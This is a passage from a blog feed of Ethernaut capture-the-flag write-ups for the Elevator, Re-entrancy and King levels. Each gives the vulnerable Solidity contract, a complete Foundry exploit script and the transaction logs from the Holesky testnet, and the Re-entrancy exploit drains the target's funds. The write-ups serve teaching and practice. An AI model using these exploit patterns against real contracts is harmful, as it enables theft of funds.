Befor locked:  <span class=\"nb\">true  </span>After locked:  <span class=\"nb\">false</span><span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.003570664 gweiEstimated total gas used <span class=\"k\">for </span>script: 35136Estimated amount required: 0.000000125458850304 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x500bbd111079c706073537e8181bdedf1346c81df182edf586f32e554fc1edfdBlock: 3693787Paid: 0.0000000857850104 ETH <span class=\"o\">(</span>24025 gas <span class=\"k\">*</span> 0.003570656 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.0000000857850104 ETH (24025 gas * avg 0.003570656 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-21-Privacy/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/21/privacy",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-21T00:00:00+09:00",
            "date_modified": "2025-04-21T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/21/elevator",
            "title": "[Ethernaut] 11.Elevator",
            "summary": null,
            "content_text": "AnalysisThe goal is  reach the top of  building.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building {    function isLastFloor(uint256) external returns (bool);}contract Elevator {    bool public top;    uint256 public floor;    function goTo(uint256 _floor) public {        Building building = Building(msg.sender);        if (!building.isLastFloor(_floor)) {            floor = _floor;            top = building.isLastFloor(floor);        }    }}In goTo()  function, Building contract address set msg.sender .If the address of my contract is set the Building contract, then my contract will be able to control the state of the Elevator contract.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Elevator.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    bool public top = true;    function ex(Elevator elevator_) public {        elevator_.goTo(1);    }    function isLastFloor(uint256 _floor) public returns (bool) {        top = !top;        return top;    }}contract ElevatorSol is Script {    Elevator public elevator_ = Elevator(0xB7C9bDDeFd874195342CfCC46B6616dEE43B333c);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Before floor: \", elevator_.floor());        console.log(\"Before top: \", elevator_.top());        Ex ex = new Ex();        ex.ex(elevator_);        console.log(\"After floor: \", elevator_.floor());        console.log(\"After top: \", elevator_.top());        vm.stopBroadcast();    }}$ forge script script/ElevatorSol.sol --tc ElevatorSol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before floor:  0  Before top:  false  After floor:  1  After top:  true## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.012500004 gweiEstimated total gas used for script: 426394Estimated amount required: 0.000005329926705576 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x383dbadbac63394500cd74036b4db823339e68086e37cae785aa356474f585b7Contract Address: 0xde8D8FEa9ca4bb8B509d26c3319D10DDd45971cCBlock: 3692540Paid: 0.000003109736504884 ETH (248779 gas * 0.012499996 gwei)##### holesky‚úÖ  [Success] Hash: 0x5deb7fb5644782b5570fa9181440860133684e910a08fe4525b5907ba5bf4c84Block: 3692540Paid: 0.000000931974701768 ETH (74558 gas * 0.012499996 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000004041711206652 ETH (323337 gas * avg 0.012499996 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>reach the top of  building.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">Building</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Elevator</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">top</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">floor</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">goTo</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_floor</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">Building</span> <span class=\"n\">building</span> <span class=\"o\">=</span> <span class=\"n\">Building</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">building</span><span class=\"p\">.</span><span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"n\">_floor</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">floor</span> <span class=\"o\">=</span> <span class=\"n\">_floor</span><span class=\"p\">;</span>            <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"n\">building</span><span class=\"p\">.</span><span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"n\">floor</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>In <code class=\"language-plaintext highlighter-rouge\">goTo()</code>  function, Building contract address set <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> .</p><p>If the address of my contract is set the Building contract, then my contract will be able to control the state of the Elevator contract.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Elevator.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">Elevator</span> <span class=\"n\">elevator_</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">goTo</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_floor</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"o\">!</span><span class=\"n\">top</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"n\">top</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ElevatorSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Elevator</span> <span class=\"k\">public</span> <span class=\"n\">elevator_</span> <span class=\"o\">=</span> <span class=\"n\">Elevator</span><span class=\"p\">(</span><span class=\"mh\">0xB7C9bDDeFd874195342CfCC46B6616dEE43B333c</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before floor: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">floor</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before top: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">top</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">elevator_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After floor: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">floor</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After top: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">top</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/ElevatorSol.sol <span class=\"nt\">--tc</span> ElevatorSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before floor:  0  Before top:  <span class=\"nb\">false  </span>After floor:  1  After top:  <span class=\"nb\">true</span><span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.012500004 gweiEstimated total gas used <span class=\"k\">for </span>script: 426394Estimated amount required: 0.000005329926705576 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x383dbadbac63394500cd74036b4db823339e68086e37cae785aa356474f585b7Contract Address: 0xde8D8FEa9ca4bb8B509d26c3319D10DDd45971cCBlock: 3692540Paid: 0.000003109736504884 ETH <span class=\"o\">(</span>248779 gas <span class=\"k\">*</span> 0.012499996 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x5deb7fb5644782b5570fa9181440860133684e910a08fe4525b5907ba5bf4c84Block: 3692540Paid: 0.000000931974701768 ETH <span class=\"o\">(</span>74558 gas <span class=\"k\">*</span> 0.012499996 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000004041711206652 ETH (323337 gas * avg 0.012499996 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-21-Elevator/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/21/elevator",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-21T00:00:00+09:00",
            "date_modified": "2025-04-21T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/20/re-entrancy",
            "title": "[Ethernaut] 10.Re-entrancy",
            "summary": null,
            "content_text": "AnalysisThe goal is  steal all the funds from the contract.// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Reentrance {    using SafeMath for uint256;    mapping(address =&gt; uint256) public balances;    function donate(address _to) public payable {        balances[_to] = balances[_to].add(msg.value);    }    function balanceOf(address _who) public view returns (uint256 balance) {        return balances[_who];    }    function withdraw(uint256 _amount) public {        if (balances[msg.sender] &gt;= _amount) {            (bool result,) = msg.sender.call{value: _amount}(\"\");            if (result) {                _amount;            }            balances[msg.sender] -= _amount;        }    }    receive() external payable {}}In, withdraw()  function, sending ether before updating the balances state can lead to Reentrancy vulnerability.Solidity 0.8.30 Documentation - security considerations  üí° To avoid reentrancy, you can use the Checks-Effects-Interactions patternExploit// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import \"../src/Reentrance.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));    constructor() public payable {        reentrance_.donate{value: 0.001 ether}(address(this));    }    function ex() external {        reentrance_.withdraw(0.001 ether);        (bool result,) = msg.sender.call{value: 0.002 ether}(\"\");    }    receive() external payable {        reentrance_.withdraw(0.001 ether);    }}contract ReentranceSol is Script {    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Before instance balances: \", address(reentrance_).balance);        Ex ex = new Ex{value: 0.001 ether}();        ex.ex();        console.log(\"After instance balances: \", address(reentrance_).balance);        vm.stopBroadcast();    }}$ forge script script/Reentrance.sol --tc ReentranceSol --broadcast[‚†ä] Compiling...[‚†í] Compiling 1 files with Solc 0.6.12[‚†ë] Solc 0.6.12 finished in 492.00msCompiler run successful with warnings:Warning (2072): Unused local variable.script/Reentrance.sol:17:10: Warning: Unused local variable.        (bool result,) = msg.sender.call{value: 0.002 ether}(\"\");         ^---------^Script ran successfully.== Logs ==  Before instance balances:  1000000000000000  After instance balances:  0## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001001646 gweiEstimated total gas used for script: 415285Estimated amount required: 0.00000041596855911 ETH==========================‚†Ñ Sequence #1 on holesky | Waiting for pending transactions    ‚°Ä [Pending] 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252    ‚°Ä [Pending] 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06##### holesky‚úÖ  [Success] Hash: 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252Contract Address: 0x87347d80F8e415A3344cA3861A49393BC95C7F29Block: 3688507Paid: 0.000000250340138956 ETH (249932 gas * 0.001001633 gwei)##### holesky‚úÖ  [Success] Hash: 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06Block: 3688507Paid: 0.000000061895911235 ETH (61795 gas * 0.001001633 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000312236050191 ETH (311727 gas * avg 0.001001633 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>steal all the funds from the contract.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">12</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Reentrance</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">donate</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_who</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"nb\">balance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_who</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">_amount</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">_amount</span><span class=\"p\">;</span>            <span class=\"p\">}</span>            <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{}</span><span class=\"p\">}</span></code></pre></div></div><p>In, <code class=\"language-plaintext highlighter-rouge\">withdraw()</code>  function, sending ether before updating the <code class=\"language-plaintext highlighter-rouge\">balances</code> state can lead to Reentrancy vulnerability.</p><p><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy\">Solidity 0.8.30 Documentation - security considerations</a></p><blockquote>  <p>üí° To avoid reentrancy, you can use the Checks-Effects-Interactions pattern</p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">12</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Reentrance.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"n\">Reentrance</span> <span class=\"k\">public</span> <span class=\"n\">reentrance_</span> <span class=\"o\">=</span> <span class=\"n\">Reentrance</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1</span><span class=\"p\">));</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">donate</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.002</span> <span class=\"kc\">ether</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ReentranceSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Reentrance</span> <span class=\"k\">public</span> <span class=\"n\">reentrance_</span> <span class=\"o\">=</span> <span class=\"n\">Reentrance</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before instance balances: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">reentrance_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After instance balances: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">reentrance_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/Reentrance.sol <span class=\"nt\">--tc</span> ReentranceSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†í] Compiling 1 files with Solc 0.6.12<span class=\"o\">[</span>‚†ë] Solc 0.6.12 finished <span class=\"k\">in </span>492.00msCompiler run successful with warnings:Warning <span class=\"o\">(</span>2072<span class=\"o\">)</span>: Unused <span class=\"nb\">local </span>variable.script/Reentrance.sol:17:10: Warning: Unused <span class=\"nb\">local </span>variable.        <span class=\"o\">(</span>bool result,<span class=\"o\">)</span> <span class=\"o\">=</span> msg.sender.call<span class=\"o\">{</span>value: 0.002 ether<span class=\"o\">}(</span><span class=\"s2\">\"\"</span><span class=\"o\">)</span><span class=\"p\">;</span>         ^---------^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before instance balances:  1000000000000000  After instance balances:  0<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001001646 gweiEstimated total gas used <span class=\"k\">for </span>script: 415285Estimated amount required: 0.00000041596855911 ETH<span class=\"o\">==========================</span>‚†Ñ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚°Ä <span class=\"o\">[</span>Pending] 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252    ‚°Ä <span class=\"o\">[</span>Pending] 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06<span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252Contract Address: 0x87347d80F8e415A3344cA3861A49393BC95C7F29Block: 3688507Paid: 0.000000250340138956 ETH <span class=\"o\">(</span>249932 gas <span class=\"k\">*</span> 0.001001633 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06Block: 3688507Paid: 0.000000061895911235 ETH <span class=\"o\">(</span>61795 gas <span class=\"k\">*</span> 0.001001633 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000312236050191 ETH (311727 gas * avg 0.001001633 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-20-Re-entrancy/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/20/re-entrancy",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","reentrancy"],
            
            "date_published": "2025-04-20T00:00:00+09:00",
            "date_modified": "2025-04-20T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/20/king",
            "title": "[Ethernaut] 09.King",
            "summary": null,
            "content_text": "AnalysisThe goals are  reclaim kingship  avoid a self proclamation.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King {    address king;    uint256 public prize;    address public owner;    constructor() payable {        owner = msg.sender;        king = msg.sender;        prize = msg.value;    }    receive() external payable {        require(msg.value &gt;= prize || msg.sender == owner);        payable(king).transfer(msg.value);        king = msg.sender;        prize = msg.value;    }    function _king() public view returns (address) {        return king;    }}Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/King.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(King king_) payable {        address(king_).call{value: king_.prize()}(\"\");    }}contract KingSol is Script {    King public king_ = King(payable(0x4Ee0991775535F17Dd47879adA5c2fca799bCA0e));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Befor king: \", king_._king());        new Ex{value: king_.prize()}(king_);        console.log(\"After king: \", king_._king());        vm.stopBroadcast();    }}$ forge script script/King.sol --tc KingSol --broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 278.71msCompiler run successful with warnings:Warning (9302): Return value of low-level calls not used.  --&gt; script/King.sol:10:9:   |10 |         address(king_).call{value: king_.prize()}(\"\");   |         